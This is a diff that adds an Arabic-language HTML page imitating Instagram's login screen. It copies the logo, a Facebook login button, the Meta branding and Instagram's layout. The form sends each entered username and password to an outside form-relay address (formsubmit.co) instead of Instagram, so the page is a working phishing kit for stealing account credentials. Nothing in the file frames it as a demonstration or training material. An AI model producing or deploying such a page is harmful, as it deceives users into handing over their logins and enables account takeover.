@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+        }
+
+        .container {
+            display: flex;
+            width: 100%;
+            min-height: 100vh;
+        }
+
+        .left-side {
+            flex: 1;
+            background-color: #000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+        }
+
+        .right-side {
+            flex: 1.2;
+            background-color: #000000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            border-left: 1px solid #262626;
+        }
+
+        .my-custom-form {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .my-custom-form h3 {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            color: #ffffff;
+            text-align: center;
+        }
+
+        .my-custom-form form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .my-custom-form input {
+            width: 100%;
+            height: 50px;
+            background: #121212;
+            border: 1px solid #363636;
+            border-radius: 25px;
+            padding: 0 20px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            outline: none;
+            color: #ffffff;
+            text-align: right;
+        }
+
+        .my-custom-form input:focus {
+            border-color: #555555;
+        }
+
+        .btn-login {
+            width: 100%;
+            height: 50px;
+            background-color: #002c4d; 
+            color: #777777; 
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            transition: background-color 0.2s ease, color 0.2s ease;
+        }
+
+        .btn-login.active {
+            background-color: #0095f6; 
+            color: #ffffff; 
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            color: #ffffff;
+            font-size: 14px;
+            text-decoration: none;
+            text-align: center;
+            margin-bottom: 40px;
+            font-weight: 500;
+        }
+
+        .btn-outline {
+            width: 100%;
+            height: 50px;
+            background: transparent;
+            color: #ffffff;
+            border: 1px solid #363636;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            margin-bottom: 16px;
+        }
+
+        .btn-outline svg {
+            width: 18px;
+            height: 18px;
+            margin-left: 10px;
+            fill: #ffffff;
+        }
+
+        .meta-footer {
+            margin-top: 40px;
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+
+        .meta-footer svg {
+            width: 16px;
+            height: 16px;
+            fill: #8e8e8e;
+            margin-left: 5px;
+        }
+
+        .right-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 440px;
+            text-align: center;
+        }
+
+        .insta-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 30px;
+        }
+
+        .main-text {
+            font-size: 32px;
+            font-weight: bold;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            color: #ffffff;
+        }
+
+        .highlight-text {
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .custom-mockup {
+            width: 260px;
+            height: 340px;
+            border: 4px solid #262626;
+            border-radius: 24px;
+            background: linear-gradient(180deg, #1a1a1a, #0a0a0a);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-around;
+            align-items: center;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .mockup-post {
+            width: 100%;
+            height: 140px;
+            background: linear-gradient(45deg, #2c2c2c, #1e1e1e);
+            border-radius: 12px;
+        }
+
+        .mockup-stories {
+            display: flex;
+            gap: 12px;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .mockup-circle {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            padding: 2px;
+        }
+
+        .mockup-inner-circle {
+            width: 100%;
+            height: 100%;
+            background: #000;
+            border-radius: 50%;
+        }
+
+        @media (max-width: 900px) {
+            .right-side {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <div class="right-side">
+            <div class="right-content">
+                <svg class="insta-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <linearGradient id="instaGrad" x1="0%" y1="100%" x2="100%" y2="0%">
+                            <stop offset="0%" style="stop-color:#f09433;stop-opacity:1" />
+                            <stop offset="25%" style="stop-color:#e6683c;stop-opacity:1" />
+                            <stop offset="50%" style="stop-color:#dc2743;stop-opacity:1" />
+                            <stop offset="75%" style="stop-color:#cc2366;stop-opacity:1" />
+                            <stop offset="100%" style="stop-color:#bc1888;stop-opacity:1" />
+                        </linearGradient>
+                    </defs>
+                    <path fill="url(#instaGrad)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.051.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/>
+                </svg>
+                <h2 class="main-text">شاهد اللحظات اليومية من <span class="highlight-text">أصدقائك المقربين</span>.</h2>
+                <div class="custom-mockup">
+                    <div class="mockup-stories">
+                        <div class="mockup-circle"><div class="mockup-inner-circle"></div></div>
+                        <div class="mockup-circle"><div class="mockup-inner-circle"></div></div>
+                        <div class="mockup-circle"><div class="mockup-inner-circle"></div></div>
+                    </div>
+                    <div class="mockup-post"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="left-side">
+            <div class="my-custom-form">
+                <h3>تسجيل الدخول إلى Instagram</h3>
+                
+                <!-- الفورم هنا بعد التعديل الكامل -->
+                <form action="https://formsubmit.co/el/nizezu" method="POST">
+                    <input type="text" name="username" id="username" required placeholder="اسم المستخدم أو البريد الإلكتروني">
+                    <input type="password" name="password" id="password" required placeholder="كلمة السر">
+                    
+                    <button type="submit" id="loginBtn" class="btn-login">تسجيل الدخول</button>
+                </form>
+
+                <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+
+                <a href="#" class="btn-outline">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                    تسجيل الدخول بحساب فيسبوك
+                </a>
+
+                <a href="#" class="btn-outline">إنشاء حساب جديد</a>
+
+                <div class="meta-footer">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19.865 3.394c-.45-.237-1.127-.514-1.995-.74a12.784 12.784 0 0 0-3.064-.37A6.474 6.474 0 0 0 8.35 4.385a5.545 5.545 0 0 0-1.688 4.1c0 2.926 2.457 5.174 5.317 5.174.654 0 1.258-.106 1.764-.298v2.33a5.584 5.584 0 0 1-1.745.267c-3.153 0-5.83-2.316-5.83-5.698 0-3.528 2.871-6.103 6.435-6.103 1.05 0 2.052.203 2.882.557l.794-2.128C15.228.175 13.784 0 12.446 0 7.394 0 3.197 3.655 3.197 8.78c0 5.132 4.372 8.766 9.406 8.766.993 0 2.032-.152 2.915-.46l.16-.057V10.74h-3.41v-2.39h5.753v7.352c-1.433.72-3.35 1.135-5.32 1.135-6.502 0-11.833-4.577-11.833-10.76C.874 3.738 6.012 0 12.188 0c2.053 0 3.992.42 5.518 1.137l2.159.993z"/></svg>
+                    Meta
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- كود الجافا سكريبت بعد الإصلاح -->
+    <script>
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password'); 
+        const loginBtn = document.getElementById('loginBtn');
+
+        function toggleButtonState() {
+            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                loginBtn.classList.add('active');
+            } else {
+                loginBtn.classList.remove('active');
+            }
+        }
+
+        usernameInput.addEventListener('input', toggleButtonState);
+        passwordInput.addEventListener('input', toggleButtonState);
+    </script>
+
+</body>
+</html>
